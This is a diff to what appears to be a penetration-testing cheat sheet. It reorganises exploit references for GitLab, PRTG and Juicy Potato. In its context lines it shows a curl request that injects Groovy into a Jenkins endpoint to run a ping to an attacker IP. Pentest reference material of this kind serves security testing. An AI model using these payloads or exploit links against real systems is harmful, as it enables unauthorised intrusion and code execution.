@@ -1124,10 +1124,11 @@ https://github.com/shk0x/PRTG-Network-Monitor-RCE/blob/master/prtg-exploit.sh
 msf > use exploit/windows/http/prtg_authenticated_rce
 ```
 
-- Juicy Potato
+- GitLab
 
 ```
-https://github.com/ohpe/juicy-potato
+http://<IP address>:<port>/explore
+https://www.exploit-db.com/exploits/49821
 ```
 
 #4. - Lateral Movement
@@ -3474,6 +3475,12 @@ $ curl -s "http://<IP address>:8080/securityRealm/user/admin/descriptorByName/or
   -H "$CRUMB" \
   --data-urlencode 'sandbox=true' \
   --data-urlencode 'value=public class x { public x(){ "ping -c 1 <Attacker IP address>".execute() } }'
+```
+
+- Juicy Potato
+
+```
+https://github.com/ohpe/juicy-potato
 ```
 
 #15. - Exploit Research
